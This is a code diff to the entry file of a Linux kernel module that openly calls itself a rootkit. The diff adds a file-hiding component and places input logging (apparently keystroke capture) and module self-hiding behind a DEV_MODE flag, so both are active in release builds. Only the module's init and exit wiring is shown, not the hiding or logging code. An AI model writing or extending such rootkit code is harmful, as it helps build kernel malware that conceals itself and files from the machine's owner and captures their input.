@@ -7,9 +7,10 @@
 
 #include "logInput.h"
 #include "moduleHide.h"
+#include "fileHide.h"
 #include "outputDevice.h"
 
-#define NOHIDE		// Needed if you intend to be able to unload/reload the module without rebooting
+#define DEV_MODE		// Needed if you intend to be able to unload/reload the module without rebooting
 
 static int __init main_init(void) {
 	int error;
@@ -19,13 +20,16 @@ static int __init main_init(void) {
 	error = outputDevice_init();
 	if (error) return error;
 
+#ifndef DEV_MODE
 	error = logInput_init();
 	if (error) return error;
 
-#ifndef NOHIDE
 	error = moduleHide_start();
 	if (error) return error;
 #endif
+
+	error = fileHide_start();
+	if (error) return error;
 
 	printk(KERN_INFO "Rootkit installed\n");
 	return 0;
@@ -33,10 +37,11 @@ static int __init main_init(void) {
 
 static void __exit main_exit(void) {
 	
-#ifndef NOHIDE
+	fileHide_stop();
+#ifndef DEV_MODE
 	moduleHide_stop();
-#endif
 	logInput_exit();
+#endif
 	outputDevice_exit();
 
 	printk(KERN_INFO "Rootkit uninstalled\n");
